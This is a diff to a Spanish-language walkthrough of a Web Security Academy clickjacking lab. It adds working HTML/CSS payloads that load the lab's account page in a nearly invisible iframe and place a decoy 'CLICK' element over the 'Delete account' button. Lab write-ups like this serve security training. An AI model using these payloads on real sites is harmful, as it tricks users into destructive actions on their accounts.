@@ -48,7 +48,6 @@ Ahora procedemos a darle estilo al `iframe`:
     height: 700px;
     opacity: 0.1;
     z-index: 2;
-    display: block;
   }
 </style>
 
@@ -56,7 +55,79 @@ Ahora procedemos a darle estilo al `iframe`:
 
 ```
 
-Vemos que se agrandó el `iframe`, incluso si acercamos el mouse sobre un elemento vemos que cambia el ícono, lo que nos da la pauta de que tenemos interacción con los elementos.
+Vemos que se agrandó el `iframe`, incluso si acercamos el mouse sobre un elemento vemos que cambia el ícono, lo que nos da la pauta de que tenemos interacción con los elementos, es decir, los botones siguen funcionando por más que sean casi transparentes.
 
+Ahora vamos a agregar un botón:
 
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 1000px;
+    height: 700px;
+    opacity: 0.1;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 100px;
+    left: 100px;
+    z-index: 1;
+  }
+</style>
+
+<div>click</div>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+```
+
+Nosotros podemos ver el elemento `click`:
+![image](https://github.com/user-attachments/assets/e742c0d5-1107-4742-b25d-7f712b948ce4)
+
+La idea ahora es ir probando hasta encontrar la configuración de modo tal que el elemento `click` quede superpuesto al botón `Delete account`. Luego de varias pruebas encontramos que la configuración correcta es la siguiente:
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 1000px;
+    height: 700px;
+    opacity: 0.1;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 515px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+
+<div>CLICK</div>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+```
+
+![image](https://github.com/user-attachments/assets/97c77e35-9026-4ac1-a168-f7ea83709db6)
+
+Ahora procedemos a bajar la transparencia de modo que el `iframe` quede casi imperceptible:
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 1000px;
+    height: 700px;
+    opacity: 0.000001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 515px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+
+<div>CLICK</div>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+```
+De modo tal que si la víctima visita esta página, verá lo siguiente:
+![image](https://github.com/user-attachments/assets/edca2881-3f92-40ca-9583-0aceacf2d34b)
 
